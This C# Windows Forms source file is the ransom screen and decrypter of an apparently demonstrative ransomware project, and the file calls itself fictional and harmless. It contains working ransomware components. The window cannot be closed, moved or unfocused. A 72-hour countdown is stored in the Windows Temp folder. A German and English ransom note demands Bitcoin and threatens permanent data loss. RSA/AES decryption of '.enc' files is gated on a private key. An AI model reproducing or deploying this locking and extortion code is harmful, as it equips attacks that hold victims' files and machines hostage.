using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Decrypter
{
    public partial class Mainform : Form
    {
        private string startTimeFilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemRoot"), "Temp/c.txt");
        private readonly TimeSpan countdownDuration = new TimeSpan(72, 0, 0);
        private DateTime? startTime;
        private TimeSpan timeLeft;
        private DateTime endTime;
        private Dictionary<string, string> texts;

        // Paths
        private string tempPath;
        private string folderToDecrypt;
        private string decrypterFolder;
        private string privateKeyPath;

        // Avoids closure
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
        }


        // Avoids Movement
        protected override void WndProc(ref Message m)
        {
            const int WM_NCLBUTTONDOWN = 0xA1;
            const int HTCAPTION = 0x2;

            if (m.Msg == WM_NCLBUTTONDOWN && m.WParam.ToInt32() == HTCAPTION)
            {
                return;
            }

            base.WndProc(ref m);
        }

        // Holds focus
        protected override void OnDeactivate(EventArgs e)
        {
            base.OnDeactivate(e);
            this.Activate();
        }

        // Mainform ---------------------
        public Mainform()
        {
            InitializePaths();
            InitializeComponent();
            InitializeCountdown();

            // Background
            string backround1Name = "Decrypter.background1.png";
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(backround1Name))
            {
                if (stream != null)
                {
                    this.BackgroundImage = Image.FromStream(stream);
                }
                else
                {
                    MessageBox.Show("Background resource not found");
                }
            }

            // Bilder aus Ressource laden
            string pictureResource = "Decrypter.unlock.png";
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(pictureResource))
            {
                if (stream != null)
                {
                    this.lock_img.Image = Image.FromStream(stream);
                }
                else
                {
                    MessageBox.Show("Resource not found");
                }
            }

            string pictureResource2 = "Decrypter.bitcoin.png";
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(pictureResource2))
            {
                if (stream != null)
                {
                    this.btc.Image = Image.FromStream(stream);
                }
                else
                {
                    MessageBox.Show("Resource not found");
                }
            }
            this.Controls.Add(this.lock_img);
            this.Paint += MainForm_Paint;

            this.about.Links.Add(0, this.about.Text.Length, "https://en.wikipedia.org/wiki/Bitcoin");

            texts = new Dictionary<string, string>
            {
                { "Deutsch", @"{\rtf1\ansi
{\colortbl ;\red255\green0\blue0;}
\b\fs40 Was ist mit meinen Dateien passiert? \b0 \line
\fs36 Ihr Computer ist von einer Ransomware-Attacke betroffen. Alle Ihre wichtigen Dateien, einschließlich Dokumente, Fotos, Videos und Datenbanken, wurden verschlüsselt. Ohne einen Entschlüsselungsschlüssel sind diese Dateien für Sie nicht mehr zugänglich.\line
\par
\b\fs40 Ist es möglich, meine Dateien wiederherzustellen? \b0 \line
\fs36 Ja, es ist möglich, Ihre Dateien wiederherzustellen. Die einzige Methode, sie zu entschlüsseln, ist die Verwendung unseres einzigartigen Entschlüsselungsschlüssels, der speziell für Ihr System erstellt wurde. \line
Versuche, die Verschlüsselung selbst zu knacken oder alternative Software zu nutzen, führen zu permanentem Datenverlust. \line
\par
\b\fs40 Wie bekomme ich den Entschlüsselungsschlüssel? \b0 \line
\fs36 Um den Entschlüsselungsschlüssel zu erhalten, müssen Sie eine Zahlung leisten. Die Zahlung erfolgt ausschließlich in Bitcoin. \line
\par
\b\fs40 Zahlungsanweisungen: \b0 \line
\fs36 Kaufen Sie Bitcoin bei einer vertrauenswürdigen Plattform. \line
Überweisen Sie den BTC-Betrag an die unten eingeblendete Adresse. \line
Kontaktieren Sie uns nach der Zahlung. \line
Sobald die Zahlung bestätigt ist, senden wir Ihnen den Entschlüsselungsschlüssel zusammen mit einer Anleitung zur Wiederherstellung Ihrer Dateien. \line
\par
\b\fs40 Was passiert, wenn ich nicht zahle? \b0 \line
\fs36 Sollte die Zahlung nicht innerhalb von 72 Stunden erfolgen, wird der Entschlüsselungsschlüssel unwiederbringlich vernichtet. Nach Ablauf dieser Frist wird es keine Möglichkeit mehr geben, Ihre Dateien wiederherzustellen. \line
\par
\b\fs40 Wichtige Warnungen \b0 \line
\fs36 Versuchen Sie nicht, die Ransomware zu entfernen oder Dateien selbst zu entschlüsseln. Dies kann zu permanentem Datenverlust führen. \line
Sichern Sie keine verschlüsselten Dateien, da Sicherungskopien ebenfalls unbrauchbar bleiben. \line
Nur wir besitzen den Entschlüsselungsschlüssel. Jede andere Lösung ist zwecklos. \line
\par
\b\fs40 Hilfe und Kontakt \b0 \line
\fs36 Wenn Sie Fragen haben, stehen wir Ihnen unter den angegebenen Kontaktdaten zur Verfügung. Beachten Sie, dass unkooperatives Verhalten dazu führen kann, dass Ihre Dateien verloren gehen. \line
\par
\cf1\b Hinweis: \b0 Dies ist eine fiktive Nachbildung eines typischen Ransomware-Textes und dient ausschließlich zu Informationszwecken.\cf0}" },

                { "English", @"{\rtf1\ansi
{\colortbl ;\red255\green0\blue0;}
\b\fs40 What happened to my files? \b0 \line
\fs36 Your computer has been hit by a ransomware attack. All your important files, including documents, photos, videos, and databases, have been encrypted. Without a decryption key, these files are no longer accessible to you.\line
\par
\b\fs40 Is it possible to recover my files? \b0 \line
\fs36 Yes, it is possible to recover your files. The only method to decrypt them is by using our unique decryption key, specifically created for your system. \line
Attempts to crack the encryption yourself or use alternative software will result in permanent data loss. \line
\par
\b\fs40 How do I get the decryption key? \b0 \line
\fs36 To obtain the decryption key, you need to make a payment. The payment is accepted exclusively in Bitcoin. \line
\par
\b\fs40 Payment instructions: \b0 \line
\fs36 Purchase Bitcoin from a trusted platform. \line
Transfer the BTC amount to the address displayed below. \line
Contact us after payment. \line
Once the payment is confirmed, we will send you the decryption key along with instructions on how to restore your files. \line
\par
\b\fs40 What happens if I don’t pay? \b0 \line
\fs36 If payment is not made within 72 hours, the decryption key will be permanently destroyed. After this period, there will be no way to recover your files. \line
\par
\b\fs40 Important warnings \b0 \line
\fs36 Do not attempt to remove the ransomware or decrypt the files yourself. This may lead to permanent data loss. \line
Do not back up encrypted files as backups will also remain unusable. \line
Only we possess the decryption key. Any other solution is futile. \line
\par
\b\fs40 Help and Contact \b0 \line
\fs36 If you have any questions, we are available through the provided contact details. Note that uncooperative behavior may result in the loss of your files. \line
\par
\cf1\b Note: \b0 This is a fictional recreation of a typical ransomware text and is for informational purposes only.\cf0}" }
            };

            this.comboBox1.Items.AddRange(new object[] { "Deutsch", "English" });
            this.comboBox1.SelectedIndex = 1;
            this.comboBox1.SelectedIndexChanged += LanguageComboBox_SelectedIndexChanged;
            this.richTextBox1.Rtf = texts["English"];
        }

        // Weiße Rahmen
        private void MainForm_Paint(object sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;

            // Array von Positionen für die Rahmen (2 Rahmen links)
            Point[] positions = {
            new Point(31, 382),
            new Point(31, 591),
            };

            Size frameSize = new Size(370, 140);
            Pen whitePen = new Pen(Color.White, 2);

            foreach (var pos in positions)
            {
                Rectangle rect = new Rectangle(pos, frameSize);
                g.DrawRectangle(whitePen, rect);
            }

            // Rahmen rechts
            Point position2 = new Point(445, 630);
            Size frameSize2 = new Size(825, 140);
            Rectangle rect2 = new Rectangle(position2, frameSize2);
            g.DrawRectangle(whitePen, rect2);

        }

        private void clock_Click(object sender, EventArgs e)
        {
        }

        // Controls countdown
        private void countdown_Tick(object sender, EventArgs e)
        {
            timeLeft = timeLeft.Subtract(TimeSpan.FromSeconds(1));
            this.clock.Text = timeLeft.ToString(@"dd\:hh\:mm\:ss");

            if (timeLeft.TotalSeconds <= 0) { this.countdown.Stop(); }
        }

        private void InitializeCountdown()
        {
            // Prüfen, ob die Startzeit bereits gespeichert ist
            if (File.Exists(startTimeFilePath))
            {
                string startTimeText = File.ReadAllText(startTimeFilePath);
                if (DateTime.TryParse(startTimeText, out DateTime savedStartTime))
                {
                    startTime = savedStartTime;
                }
            }
            else
            {
                // Erster Start: Startzeit setzen und speichern
                startTime = DateTime.Now;
                File.WriteAllText(startTimeFilePath, startTime.Value.ToString("o"));
            }

            // Deadline berechnen
            this.endTime = startTime.Value.Add(this.countdownDuration);
            string formattedEndTime =
                endTime.ToString(@"MM\/dd\/yyyy 
hh\:mm tt", CultureInfo.InvariantCulture);
            this.deadline.Text = formattedEndTime;

            // Verbleibende Zeit berechnen
            TimeSpan elapsedTime = DateTime.Now - startTime.Value;
            timeLeft = countdownDuration - elapsedTime;

            if (timeLeft < TimeSpan.Zero)
            {
                timeLeft = TimeSpan.Zero;
                this.countdown.Stop();
            }
            this.clock.Text = timeLeft.ToString(@"dd\:hh\:mm\:ss");
        }

        private void about_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            // Öffne den Link im Standardbrowser
            string target = e.Link.LinkData as string;
            if (!string.IsNullOrEmpty(target))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = target,
                    UseShellExecute = true
                });
            }
        }

        private void info_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("This software is for demonstration purposes only and poses no risk to your system.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);

        }

        private void LanguageComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            string selectedLanguage = this.comboBox1.SelectedItem.ToString();
            if (texts.ContainsKey(selectedLanguage))
            {
                this.richTextBox1.Rtf = texts[selectedLanguage];
            }
        }

        private void Mainform_Load(object sender, EventArgs e)
        {

        }

        private void copy_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(this.btcAddress.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.keyImport.Filter = "XML Files (*.xml)|*.xml|All Files (*.*)|*.*";
            if (this.keyImport.ShowDialog() == DialogResult.OK)
            {
                string fileName = this.keyImport.SafeFileName;
                privateKeyPath = this.keyImport.FileName;
                this.select.Text = fileName;
                this.select.BackColor = Color.Gainsboro;
                this.select.ForeColor = SystemColors.ControlDark;
                this.decrypt_button.Enabled = true;
                this.decrypt_button.BackColor = Color.White;
                this.decrypt_button.ForeColor = SystemColors.ControlText;
            }
        }

        private void decrypt_button_Click(object sender, EventArgs e)
        {
            this.progressBar1.Visible = true;
            this.decrypt_button.Enabled = false;
            this.DecryptFiles();
            this.ResetWallpaper();
            MessageBox.Show("Decryption completed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        // Decryption Logic ---------------------------------
        // Paths
        private void InitializePaths()
        {
            tempPath = Path.Combine(Environment.GetEnvironmentVariable("SystemRoot"), "Temp");
            folderToDecrypt = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Wallpaper");
            decrypterFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        }

        public static class Wallpaper
        {
            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDCHANGE = 0x02;

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

            public static void Set(string path)
            {
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            }
        }

        // Reset the desktop background to the default wallpaper
        private void ResetWallpaper()
        {
            string windowsPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string wallpaperPath = Path.Combine(windowsPath, "Web", "Wallpaper", "Windows", "img0.jpg");
            Wallpaper.Set(wallpaperPath);

            string blackWallpaperPath = Path.Combine(tempPath, "black.jpg");
            if (File.Exists(blackWallpaperPath))
            {
                File.Delete(blackWallpaperPath);
            }
        }

        // Decryption
        private void DecryptFiles()
        {
            try
            {
                string privateKeyXml = File.ReadAllText(privateKeyPath);
                using (var rsa = new RSACryptoServiceProvider())
                {
                    rsa.FromXmlString(privateKeyXml);

                    string encryptedAESKeyPath = Path.Combine(tempPath, "encrypted_AES_Key.bin");
                    if (!File.Exists(encryptedAESKeyPath)) throw new FileNotFoundException("Encrypted AES key not found.");

                    byte[] encryptedAESKey = File.ReadAllBytes(encryptedAESKeyPath);
                    byte[] aesKey = rsa.Decrypt(encryptedAESKey, false);

                    var encryptedFiles = Directory.GetFiles(folderToDecrypt, "*.enc");
                    foreach (var file in encryptedFiles)
                    {
                        string outputFile = Path.Combine(folderToDecrypt, Path.GetFileNameWithoutExtension(file));
                        DecryptFile(file, outputFile, aesKey);
                        File.Delete(file);
                    }
                }
            }
            catch (CryptographicException ex)
            {
                MessageBox.Show("Decryption failed. The private key might be incorrect or does not match the encrypted data.",
                                "Decryption Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void DecryptFile(string inputFile, string outputFile, byte[] key)
        {
            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var fsInput = File.OpenRead(inputFile))
                {
                    byte[] iv = new byte[16];
                    fsInput.Read(iv, 0, iv.Length);
                    aes.IV = iv;

                    using (var decryptor = aes.CreateDecryptor())
                    using (var cryptoStream = new CryptoStream(fsInput, decryptor, CryptoStreamMode.Read))
                    using (var fsOutput = File.Create(outputFile))
                    {
                        cryptoStream.CopyTo(fsOutput);
                    }
                }
            }
        }
    }
}
